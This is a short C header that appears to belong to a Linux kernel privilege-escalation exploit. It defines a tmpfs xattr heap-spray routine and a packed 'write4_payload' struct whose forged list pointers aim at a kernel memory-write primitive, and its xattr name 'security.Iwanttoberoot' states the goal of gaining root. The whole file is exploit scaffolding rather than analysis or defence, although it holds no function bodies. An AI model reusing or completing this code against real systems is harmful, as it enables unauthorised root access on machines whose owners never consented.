#ifndef _SIMPLE_XATTR_H_
#define _SIMPLE_XATTR_H_

#include <stdint.h>

#define XATTR_FILE "/tmp/tmpfs/a"
#define XATTR_VALUE "value"

#define XATTR_DELETION_NAME "security.Iwanttoberoot"

#define ATTRIBUTE_NAME_LEN 0x100
#define COMMAND_MAX_LEN 0x100

#define PREFIX_BUFFER_LEN 16

struct write4_payload {
    uint8_t prefix[PREFIX_BUFFER_LEN];
    void *next;
    void *prev;
    uint8_t name_offset;
} __attribute__((packed));

void spray_simple_xattr(char *filename, uint32_t spray_size);
void create_xattr(const char *filename, char *attribute_name);

#endif /* _SIMPLE_XATTR_H_ */
